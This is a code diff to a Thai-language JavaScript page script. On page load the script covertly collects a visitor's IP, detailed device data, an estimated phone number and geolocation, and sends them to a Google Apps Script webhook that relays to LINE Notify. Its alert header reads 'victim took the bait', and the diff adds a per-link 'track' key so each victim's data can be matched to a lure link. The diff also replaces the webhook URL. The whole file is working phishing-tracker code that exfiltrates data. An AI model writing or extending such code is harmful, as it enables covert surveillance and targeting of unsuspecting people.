@@ -1,3 +1,14 @@
+// ฟังก์ชันดึง tracking key จาก URL parameters
+function getTrackingKeyFromUrl() {
+  try {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get('track');
+  } catch (error) {
+    console.error("ไม่สามารถดึง tracking key จาก URL ได้:", error);
+    return null;
+  }
+}
+
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
 (function() {
   // เก็บข้อมูลทั่วไป
@@ -10,6 +21,9 @@
     minute: '2-digit',
     second: '2-digit'
   });
+  
+  // ดึง tracking key จาก URL parameters (ถ้ามี)
+  const trackingKey = getTrackingKeyFromUrl() || "ไม่มีค่า";
 
   // เก็บข้อมูลอุปกรณ์แบบละเอียด
   const deviceInfo = getDetailedDeviceInfo();
@@ -43,25 +57,25 @@
         // ตรวจสอบข้อมูลเบอร์โทรศัพท์ (หรือประมาณการณ์)
         estimatePhoneNumber().then(phoneInfo => {
           // ส่งข้อมูลครั้งแรกทันทีพร้อม IP (ไม่มีพิกัด)
-          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo);
+          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey);
 
           // พยายามขอข้อมูลพิกัด (ถ้าผู้ใช้อนุญาต)
-          tryGetLocation(ipData, timestamp, referrer, allDeviceData, phoneInfo);
+          tryGetLocation(ipData, timestamp, referrer, allDeviceData, phoneInfo, trackingKey);
         }).catch(phoneError => {
           console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", phoneError);
-          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null);
-          tryGetLocation(ipData, timestamp, referrer, allDeviceData, null);
+          sendToLineNotify(ipData, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null, trackingKey);
+          tryGetLocation(ipData, timestamp, referrer, allDeviceData, null, trackingKey);
         });
       })
       .catch(error => {
         console.error("ไม่สามารถดึงข้อมูล IP ได้:", error);
         // ส่งข้อมูลโดยไม่มี IP
         estimatePhoneNumber().then(phoneInfo => {
-          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo);
-          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, phoneInfo);
+          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, phoneInfo, trackingKey);
+          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, phoneInfo, trackingKey);
         }).catch(() => {
-          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null);
-          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, null);
+          sendToLineNotify({ip: "ไม่สามารถระบุได้"}, "ไม่มีข้อมูล", timestamp, referrer, allDeviceData, null, trackingKey);
+          tryGetLocation({ip: "ไม่สามารถระบุได้"}, timestamp, referrer, allDeviceData, null, trackingKey);
         });
       });
   });
@@ -325,7 +339,7 @@ async function estimatePhoneNumber() {
 }
 
 // ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
-function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo) {
+function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey) {
   if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(
       function(position) {
@@ -341,7 +355,7 @@ function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo) {
         };
 
         // ส่งข้อมูลอีกครั้งพร้อมพิกัด
-        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo);
+        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey);
       },
       function(error) {
         console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
@@ -356,13 +370,16 @@ function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo) {
 }
 
 // ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
-function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo) {
+function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey) {
   // ข้อความหลัก
   const message = [
     "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
     `⏰เวลา: ${timestamp}`,
   ];
-
+  // เพิ่มข้อมูล Tracking Key (ถ้ามี)
+  if (trackingKey && trackingKey !== "ไม่มีค่า") {
+    message.push(`🔑Tracking Key: ${trackingKey}`);
+  }
   // --- ข้อมูล IP ละเอียด ---
   message.push(`🌐IP: ${ipData.ip || "ไม่มีข้อมูล"}`);
   if (ipData.hostname && ipData.hostname !== "ไม่มีข้อมูล") {
@@ -434,12 +451,12 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 }
 
 // ฟังก์ชันส่งข้อมูลไปยัง LINE Notify ผ่าน API
-function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo) {
+function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo, trackingKey) {
   // สร้างข้อความละเอียด
-  const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo);
+  const detailedMessage = createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey);
 
   // ส่งข้อมูลไปยัง webhook ของเรา (ที่ต่อกับ LINE Notify)
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw6B3bxncYwEZhR0PxVrtofLGvL_RNllnd1CnS-rmJFs_nxuh33dYyg7i1WU_ndZZdcTA/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxInoopVCAhD7DFyadnD-GHmGbkMYh9BaId7COS0BfnueSq2wLPgFH8PkLWxJmFf72Htg/exec';
 
   // เตรียมข้อมูลสำหรับส่ง
   const dataToSend = {
@@ -449,7 +466,8 @@ function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, pho
     ip: ipData,
     deviceInfo: deviceData,
     phoneInfo: phoneInfo, // เพิ่มข้อมูลเบอร์โทรศัพท์
-    referrer: referrer
+    referrer: referrer,
+    trackingKey: trackingKey // เพิ่ม tracking key ในข้อมูลที่ส่งไป
   };
 
   // ส่งข้อมูล
